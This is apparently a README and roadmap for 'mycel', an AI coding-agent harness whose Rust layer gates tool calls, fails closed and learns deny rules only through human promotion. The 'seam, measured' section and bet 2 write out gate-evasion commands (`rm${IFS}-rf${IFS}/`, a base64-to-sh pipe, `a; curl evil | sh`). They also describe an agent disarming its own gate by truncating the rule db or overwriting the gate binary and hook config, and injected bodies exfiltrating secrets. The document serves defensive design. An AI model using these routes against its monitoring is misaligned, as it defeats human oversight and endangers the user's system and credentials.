# mycel

an agent harness where safety and memory are one persistent substrate that sits under the model, fails closed, and is only ever taught by a human. a disposable TS body (a kimi-code fork) does the coding. a durable Rust brain gates every action and holds what the body can't be trusted with. the brain outlives the body.

## what mycel is

three pieces, joined on purpose:

- a **body**: the kimi-code fork. runs the model loop, tools, context, the actual coding. swappable tissue.
- a **brain**: a Rust workspace (`crates/`) that owns the gate and the substrate primitives. this is the product.
- a **seam**: `mycel-gate` and `mycel-mcp-server` join the two trees, so every tool call the body wants to make passes through the brain first.

what's shipped today: a fail-closed antibody gate that denies by default with a deterministic (non-LLM) verdict, and an m2 learning loop. learned rules stay inert until a human promotes them; promoted rules persist. most of what follows in this doc is not built yet, and the bets say so where it matters. the gate governs the shell tool today; "the seam, measured" below is honest about the rest.

honest current state, one line: right now mycel is a fail-closed gate bolted onto a good body. the work is making it a coding agent you would actually pick up every day, that also happens to be the one you trust to leave running.

## the seam, measured

before the bets, the honest measured state of the seam today, from an adversarial read of the real repo. this is where the "now" bets come from.

the gate is real and fail-closed, but it governs one tool. `mycel-gate` is wired as a PreToolUse hook with `matcher = "Bash"` only (`config/mycel.config.toml.template`). the hook engine fires for every tool then filters on the tool name, so the gate binary never even spawns for `Write`, `Edit`, `FetchURL`, or MCP calls. and the binary reads only `tool_input.command` and hardcodes `file_path: None` (`crates/mycel-gate/src/main.rs`), so it structurally can't judge a file write. the Rust core already has file-path antibody matching (`crates/mycel-core/src/lib.rs`); it's just never routed. implemented, not wired.

three lanes, measured:

- **Bash: authoritative but soft.** fail-closed enforcement holds end to end (nonzero exit, deny, timeout, crash all block, and a deny returns before the tool dispatches). but matching is raw substring (`str::contains`, `crates/mycel-core/src/lib.rs:1273`), so `rm${IFS}-rf${IFS}/` or `echo ...|base64 -d|sh` walk straight past a `rm -rf /` antibody. a tripwire for the exact bytes, not a boundary.
- **write / edit / MCP-path: now floored (was "no teeth").** the gate governs every tool (catch-all matcher) and a compiled protected-path floor blocks a `Write`/`Edit` (or an MCP write carrying a `path`) that targets `~/.mycel/bin`, the installed config, or the substrate - evaluated before the db is opened, canonicalizing against the payload cwd / `~` / symlinks / case so respelling can't dodge it. the truncated-db route (`: > mycel.db` -> empty-schema allow-all) is closed by a strict read-only db open. RESIDUAL: a Bash *command* that writes those same paths (`cp` / `tee` / redirect) is still not structurally floored - that needs the structured command parse (bet 2), and an MCP write carrying its target in a non-`path` field stays name-only-blockable.
- **antibody memory: safe to teach, but it never forgets.** generation is air-gapped from enforcement (deterministic non-LLM classification, human-only promotion, nothing auto-arms), which is the strong part and it holds. but the pruning side is unwired: promoted rules never expire (no write path sets a TTL), never decay, and there is no delete; and the gate only matches `Project`-scope rules, so `Global`/`Personal` rules a human adds are silently inert. the immune system can learn; it has no tolerance or clearance yet.

none of this is fatal and none of it is hidden. it is the gap between the immune-system claim and the current wiring, and it is exactly what the bets close.

## why it exists

almost every harness on the market fails open. the safety layer lives in the same process as the model. it's a hook, a plugin, an advisory check. if the hook times out, the action proceeds. if the config is missing, the action proceeds. if a subagent spawns, it often skips the check entirely. remove the safety layer and the harness still runs, just without brakes.

and none of them remember. memory is an `AGENTS.md` file the model reads on the way in. an incident happens, the model gets corrected in-context, the session ends, the lesson is gone. next session starts naive.

those are the same bug. safety and memory are both state that has to outlive the model and hold even when the model is wrong or hostile. build that as a plugin on top of the body and you get fail-open and amnesia. build it as a substrate under the body and you get fail-closed and something that can carry a lesson forward.

the bet: a persistent Rust substrate that owns safety and memory, decides deterministically before the model runs, and can only be taught by a human. that is the thing opencode, crush, and claude-code structurally can't be, because their policy lives in-process with the model and their memory is a text file, advisory and forgetful by construction.

one caveat worth stating up front: a safety spine on a harness nobody runs is theoretical. so the honest order of work is be a daily driver worth picking up first, then let fail-closed be the reason to choose it over an equally good one. this doc is written in that order.

| posture | the field | mycel |
|---|---|---|
| gate error / missing config / timeout | proceed | deny |
| where policy lives | in-process with the model | in the Rust substrate, under the body |
| kernel floor under the gate | some have it, most optional | required to boot (target) |
| what happens after a failure | corrected in-context, then forgotten | a human-signed rule, enforced deterministically (auto-mining the failure is a target) |
| who holds the secret | the body, in plaintext | the brain; the body sees a sentinel (target) |
| model judgment on the gate | sometimes load-bearing | advisory only, never authoritative |

## where the field is

the read from mapping fourteen harnesses.

the table stakes have converged: MCP, headless/CI mode, context compaction, BYOK with local models, `AGENTS.md`-style memory, plan/read-only mode, skills. mycel already inherits most of them through the kimi body, some of it unverified since we haven't audited the body's internals.

what has not converged is safety. the field is a decent daily driver almost everywhere and safe-by-default almost nowhere. most gates fail open: timeout proceeds, subagents bypass. Roo is the notable fail-closed exception, Codex leans that way. the real floors (kernel sandbox, egress control, credential masking, event-sourced audit) exist, but scattered across different codebases, and no single harness ships all of them.

read the two tables together and the work is obvious: mycel bought convenience-parity cheaply by forking a good body. the spine is the part nobody hands you.

| table stakes (field converged) | who ships it | mycel today |
|---|---|---|
| MCP tool federation | 12/14 | yes (mycel-mcp-server) |
| headless / CI one-shot + stream-JSON | nearly all | yes (inherited) |
| provider-agnostic BYOK + local models | most | yes (inherited) |
| automatic context compaction | most | yes (inherited, internals unverified) |
| memory/rules files (AGENTS.md convention) | nearly all | yes (inherited) |
| plan / enforced read-only mode | CC, OpenCode, Cline, Gemini, Roo, Factory | yes (inherited kimi plan mode) |
| skills with progressive disclosure | CC, OpenCode, Crush, OpenHands, Amp | yes (inherited) |
| subagent delegation | 12/14 | no (known gap) |
| checkpoint / undo | most (shadow-git or git-backed) | no (message-level only) |

| safety floor (rare) | who ships it | mycel today |
|---|---|---|
| fail-CLOSED by default | Roo; Codex leans; Factory whole-process | yes, all tools; Write/Edit + truncated-db self-disarm sealed; Bash-command write to protected paths residual |
| OS/kernel sandbox floor | CC, Codex, Gemini, OpenHands, SWE-agent, Factory | no (P0 gap) |
| network egress allowlist | CC, Gemini, Factory, Goose | no (P0 gap) |
| credential masking at the wire | CC (alone at fidelity) | no (P1 gap) |
| config can't self-escalate | CC, Factory | no (measured: no ~/.mycel jail) |
| immovable protected-path denylist | CC, Factory | partial (Write/Edit/MCP-path floor shipped; Bash-command lane residual) |
| event-sourced audit + replay | OpenHands | partial (m2 learning loop) |

## the starting line (what already holds)

so the bets below read as additions and not the whole story, here is what is already true:

- fail-closed gate. deny by default. deterministic, non-LLM verdict. this is the identity, shipped.
- `mycel-gate`: a programmable pre-tool gate. `mycel-mcp-server`: every MCP tool reachable through the gate by name-pattern.
- m2 learning loop shipped. learned rules stay inert until a human promotes them; promoted rules persist. auto-mining a failure into a candidate rule is a direction, not something shipped today.
- inherited from the kimi body: MCP, skills, headless, compaction, BYOK, memory files, plan mode, four autonomy modes. convenience surface, mostly unverified internally.

two baseline gaps are acknowledged and both are under-scoped as written. "no compound-command splitting" (splitting alone doesn't cover subshells, pipes, or substitution) and "no autonomous spawning yet" (spawning is a gate-inheritance problem, not just a feature). the bets treat them at their real size.

## the north star: an immune system, not a policy file

the organizing idea is biological, and it's load-bearing, not decoration.

**innate immunity** is the floor you're born with. fixed, deterministic, present before any learning: the kernel sandbox, the structured command parse, the protected-path denylist, default-deny egress. it decides without a model call and holds even when everything above it is compromised. no incident is required to arm it.

**adaptive immunity** is what you learn, and this is the direction more than the current state. a failure (a blocked-but-attempted action, a bad edit, a loop) should produce an antibody: a specific, cheap, deterministic denial for that shape of thing. today the m2 loop persists promoted rules and keeps learned rules inert until a human signs them. auto-mining a failure into a candidate rule is the next milestone, not a shipped capability.

and here is the part the metaphor actually explains: adaptive immunity needs a second signal, or you get autoimmunity. a rule that auto-promotes on a single failure starts attacking legitimate work. so mycel's antibodies stay inert until a human promotes them. that isn't caution for its own sake, it's the design that keeps the immune system from turning on the host. it's already the stance and it stays the stance.

the **substrate** is the marrow. secrets, audit, checkpoints, and the rule library live in the Rust brain, which persists across sessions, models, and bodies. swap the kimi fork for a different body, or run a different model inside it, and the memory survives untouched. that's the whole reason to split brain from body: **a compromised or injected body cannot exfiltrate a secret it never held.**

stated plainly: the safe state is the only bootable state. no gate, no run. no sandbox, no run. every action passes a deterministic antibody that fails closed. a kernel floor holds underneath it, so a bad verdict or an injected command still can't reach the host. every verdict lands in a log you can replay. and mycel reaches parity with the daily drivers without ever loosening the spine to get there.

## design principles

non-negotiable. safety spine first, in order.

- **fail closed, always.** gate error, timeout, absent script, unknown verdict: all deny. the safe state is the only startable state. inverts the fire-and-forget fail-open defaults in Codex/Crush/Kimi hooks (timeout proceeds, subagents bypass).
- **the floor is deterministic and lives under the model.** innate before adaptive. the authoritative verdict never needs a model call. an LLM-judge outage degrades to safe-deny, never to allow. proven in OpenHands and Goose ensembles, defaults inverted to closed.
- **the ordering is the mechanism.** the protected-path denylist runs before any allow-rule, so a dangerous target can never be auto-approved. cheap deterministic checks run before expensive ones. Claude Code and Factory's unconditional-blocklist pattern.
- **blind the judge to attacker bytes.** if the antibody ever uses model judgment, it decides from action plus trusted policy only, never from tool-result content (Claude Code's reasoning-blind classifier). attacker text in a file can't argue its way to approval.
- **the brain holds what the body can't be trusted with.** secrets, audit, checkpoints, rules. the body sees a sentinel, not the token. a structural guarantee, not a behavioral hope.
- **self versus non-self.** foreign config can tighten the gate, never loosen it. union-merge on deny across org, project, user. a cloned repo can't widen the agent on checkout.
- **learn from failure, but don't trust the lesson until a human signs it.** no self-promoting rules.
- **capability minimization by default.** an untrusted tool starts hidden, not merely gated (Crush disabled_tools, Amp skill-gated MCP). the model can't thrash against a tool it can't see.
- **reject with feedback, not dead-stop.** a block returns a structured reason the agent re-plans against. fail-closed should steer, not brick.
- **honest about the body.** the kimi internals (compaction, plan mode, session resume) are inherited and unverified. we make guarantees in the substrate, where we control the code. we don't claim the body's behavior as our own.

## the bets

scope-tiered. each is a concrete capability, tied to the harness(es) that prove it out and to why it's mycel's problem specifically. none are shipped unless stated.

### now

**1. kernel sandbox floor in the substrate, fail-closed.**
default-deny writes outside cwd plus tempdir. refuse to start if isolation can't initialize. inherit the boundary to every child process. landlock/seccomp on Linux, seatbelt on macOS.
- proven by: Claude Code, Codex, Gemini (seatbelt/bwrap); OpenHands, SWE-agent (Docker); Factory (whole-process, refuses to start without it).
- why it's the spine: today the antibody gate is policy-only. one parse miss, one over-broad allow, one injected command is full user-privilege execution with no backstop. permission-by-command-string is defeatable; a kernel boundary is not. "no isolation, no run" is mycel's identity as a boot invariant, and the Rust substrate is its natural owner.
- honest note: this is the heaviest bet in the doc. a cross-OS floor (Linux and macOS) is plausibly more work than several of the other bets combined, and it's fine for it to land one platform at a time rather than block the tier.

**2. structured command parse, deny on unparseable.**
replace prefix-matching with a real parse. gate on the AST. cover compound `;` and `&&`, subshells, pipes, and env-var/process/parameter substitution. anything the parser can't understand is denied. adopt Roo's substitution-and-pipe guard (`${var@P}`, `=(...)`, `curl|sh`) and longest-prefix-deny-wins as the floor, with a Claude Code style classifier as the semantic backstop.
- proven by: OpenCode and Roo (both document prefix-matching as brittle and bypassable); Roo's concrete guard.
- why it's the spine: this is the baseline's own known gap at its real size. splitting alone leaves subshell and indirection holes. without a real parse the antibody is defeated by a one-line `a; curl evil | sh`. pure spine, no feature-chase.

**3. default-deny network egress.**
a substrate-held proxy with an explicit domain allowlist. nothing pre-allowed. a tool with no egress can't phone home.
- proven by: Claude Code, Gemini, Factory (filtering proxy); Goose (EgressInspector).
- why it's the spine: command and file gates miss the wire. a "safe" curl to an attacker domain sails through today. this closes exfiltration and it's the precondition for credential masking (bet 4).

### next

**4. credential masking at the egress proxy.**
the Rust brain holds secrets. the TS body only ever sees a per-session sentinel. the real token is injected solely for allowlisted hosts, and it fails closed (auth breaks, not leaks) if the proxy is misconfigured.
- proven by: Claude Code (alone at this fidelity); OpenHands and Goose mask in logs only, which is weaker.
- why it's the spine: turns "don't leak the token" into a structural guarantee. an injected or compromised body can't exfiltrate a secret it never held. builds directly on bet 3, and the kimi body currently ships plaintext keys in config, so the hole is live. this is what the brain/body split is for.

**5. config-trust scoping plus an immovable protected-path denylist.**
in-repo and local config can tighten the gate, never loosen it (union-merge on deny, extension-only semantics). ship a non-negotiable path denylist (gate config, `.git` internals, shell rc, CI hooks, lockfiles) evaluated before any allow-rule, with symlink resolution. enforce as a property-tested invariant: no repo file can widen an org deny.
- proven by: Claude Code (repo scope can't self-grant auto/bypass), Factory (org deny union-merge, lower layers only narrow).
- measured motivation: today a `Write` can overwrite `~/.mycel/bin/mycel-gate` or the config's `[[hooks]]` block and disarm the gate same-session, because nothing protects those paths. this denylist plus a `~/.mycel` jail is what closes that.
- why it's the spine: cheap, high-leverage supply-chain defense. the check-ordering and the merge asymmetry are the mechanism, not an implementation detail. composes cleanly with "learned rules inert until promoted," and the property test is exactly the discriminating, load-bearing invariant the identity wants.

**6. the gate as a hash-pinned external contract.**
JSON in, typed allow/deny/rewrite out. fails closed on error, absence, or timeout. editing the gate script re-flags it for review against its content hash, so a mutated antibody silently loses its old approval. let org delegates (OPA, classifiers, secret-scanners) bolt on, but only to ADD denies. a block returns a structured reason the agent re-plans against.
- proven by: Codex (hook trust by content hash), Amp (exit-code verdict), Factory (OPA), OpenHands (reject-with-feedback).
- why it's the spine: inverts the fail-open hook defaults (timeout proceeds, subagents bypass) into fail-closed, makes the gate tamper-evident, and keeps the core non-bypassable while orgs bolt on their own denies.

**7. substrate-owned checkpoint around every tool call, including Bash.**
shadow-git snapshot immediately before any gated mutation. capture untracked files. never touch the user's real VCS history. restore files-only or files-plus-task.
- proven by: Cline (per-tool-use), Roo (pre-edit), Gemini (pre-modify); Claude Code documents the Bash blind-spot this closes.
- why it's the spine: reversibility becomes a real input to the gate's risk decision. the gate can allow a risky-but-reversible mutation because rollback is one command, and a fail-closed block always leaves a clean, labeled restore point. undo is a substrate guarantee, independent of the body.

**8. subagent delegation, built gate-first.**
the antibody is inherited non-overridably. each child gets a strict subset of the parent's capabilities, re-checked at spawn, during, and return. preserve the no-nested-children delegation-depth rule.
- proven by: Claude Code (subagent permissionMode ignored in auto), Gemini (per-subagent allowlist), Factory (per-droid subset), Amp (Oracle read-only), Roo (mode groups). Kimi AgentSwarm's name-only match at 128-agent fan-out is the anti-pattern.
- why it's the spine: the baseline's "no autonomous spawning yet" reads like a feature gap. it's a safety-design gap. done naively, spawning is the gate's single largest bypass. done gate-first, a table-stakes feature turns into a differentiator. this is why mycel refuses to ship spawning before the inheritance design lands.

### later

**9. gate verdicts as first-class events in an append-only, replayable audit log.**
event-sourced. every action and every gate decision plus rationale is a durable event. deterministic replay for crash-resume and compliance.
- proven by: OpenHands (append-only event store, base_state.json replay); partial in Goose (SQLite), SWE-agent (trajectory), Kimi (wire.jsonl).
- why it's the spine: for a safety-spine product the tamper-evident, replayable record is the product. it extends the m2 learning loop from partial credit into a full auditable substrate, and unlocks checkpoint/rewind and reject-with-feedback for free.

**10. antibody as a deterministic composable analyzer ensemble.**
ordered cheap-deterministic first, model-judgment last and advisory. highest-severity-wins. `propagate_unknown = deny`. add a fail-closed loop guard: escalate to DENY after N identical flagged calls, and log the loop to the durable brain.
- proven by: OpenHands (Pattern/PolicyRail/Ensemble), Goose (Security to Egress to Adversary to Permission to Repetition); OpenCode doom_loop and Goose RepetitionInspector for the guard, both default to ask, mycel denies.
- why it's the spine: this is the gate architecture already proven in two codebases, with the defaults inverted to fail-closed. the deterministic checks stay authoritative, any model judgment is strictly advisory, so a judge outage degrades to safe-deny.

**11. LLM-free repo map in the substrate.**
tree-sitter symbol graph, PageRank, token-budgeted, gate-inspectable. the default standing-context primer.
- proven by: Aider (tree-sitter + PageRank), Roo (tree-sitter + local embeddings).
- why it's here and last: this is quality, not safety. the kimi body has only grep/glob plus an explore subagent, which is weak on large repos and hurts daily-driver credibility. delivered as a deterministic, auditable, substrate-owned primitive it stays consistent with the local-first, trustworthy-context ethos instead of opaque vector retrieval. lowest priority because the spine doesn't need it.

**12. antibody lifecycle: tolerance and clearance.**
promoted antibodies need a TTL, a decay path, and a delete, plus scope enforcement, or the human-curated denylist becomes a permanent grudge. measured today: `antibody-add` never sets `expires_at`, the decay engine only touches the `runs` table, there is no delete command, and the gate matches `Project`-scope rules only, so `Global`/`Personal` promotions are silently inert. wire antibody expiry, `maintain`-driven decay, a disable/delete path, scope enforcement, and a promotion audit trail with a real hit-count.
- proven by: the metaphor itself (immune tolerance and clearance are what stop adaptive immunity from turning autoimmune over time); the existing `runs` decay engine is the substrate to extend.
- why it's the spine: fail-closed plus monotonic accumulation converges on a gate that denies too much and gets switched off. clearance is what keeps the persistent brain from becoming a persistent grudge. cheap relative to the P0 bets; arguably belongs in "next."

## non-goals

what mycel deliberately will not do.

- **not another fail-open harness with an optional safety plugin.** if the safety layer can be removed and the harness still runs, we built the wrong thing. no "proceed on timeout," no silent degrade to no-sandbox.
- **model judgment will never be on the authoritative path.** the deterministic verdict decides; model judgment is advisory and blind to untrusted tool-result content. we won't feed attacker-controlled bytes into the gate's decision.
- **no autonomous spawning before the gate-inheritance design lands.** name-only permission matching at fan-out (the Kimi AgentSwarm anti-pattern) is not on the table. subagents inherit the gate non-overridably or they don't exist.
- **no self-promoting rules.** learned rules never auto-enforce. a human signs every promotion. autoimmunity is a design failure, not an edge case.
- **no capability that can't be gated.** if a feature can't route through the antibody, it doesn't ship. new or untrusted tools default hidden, not merely gated.
- **not a model, not cloud-first.** BYOK, provider-agnostic, local-capable. no bundled model, no mandatory telemetry, no phone-home. an explicit hedge against 2026 vendor consolidation.
- **graft, don't rewrite.** the kimi body's loop, TUI, compaction, and skills stay unless there's a safety reason to touch them. the work is the spine and the short daily-driver gap list, not a from-scratch harness.
- **we don't claim the body's inherited behavior as a mycel guarantee.** compaction, plan mode, session resume are inherited and unverified. we say so.
- **not trying to be the most autonomous harness.** trying to be the one you can leave running.

## how we'll know it's working

concrete, checkable, refute-by-default. a gate we can't show ran didn't run.

daily driver (are people actually running it):

- you can take a multi-file feature from prompt to tests to commit without reaching for another harness.
- subagents fan out and come back with their results, and none of them can do something the parent could not.
- a bad edit is one rewind away, and the rewind restores files on disk, not just the chat.

safety spine (is fail-closed structural, not aspirational):

- fault injection can't open the gate. timeout, crash, malformed script, absent script: each produces DENY. property-tested.
- `a; curl evil | sh` is denied, not approved-because-`a`-was. the structured parse holds against compound and substitution bypasses.
- no repo-scoped config file can widen an org-scoped deny. property test, as an invariant.
- the sandbox refuses to start when isolation is unavailable, instead of silently degrading to no sandbox. verified on Linux and macOS, not assumed.
- an injected body can't read a real secret, and egress to a non-allowlisted domain is blocked at the proxy. the body sees the sentinel, the wire sees the token only for allowlisted hosts.
- an injected tool-result can't talk the gate into approving, because the gate never read it.
- every action and every gate verdict replays. deterministic replay reproduces a session from the event log.
- a headless run with no human present either completes or fails closed. it never fails open, and blocks come back as reject-with-feedback the agent re-plans against.

the tell: someone picks mycel over an equally capable harness, and when you ask why, the answer is "it's the one i trust to leave running."

---

last updated 2026-07-20. this is a direction, not a shipped feature list. the fail-closed gate and the m2 learning loop exist; most of the bets don't yet. we'll keep this honest about that.
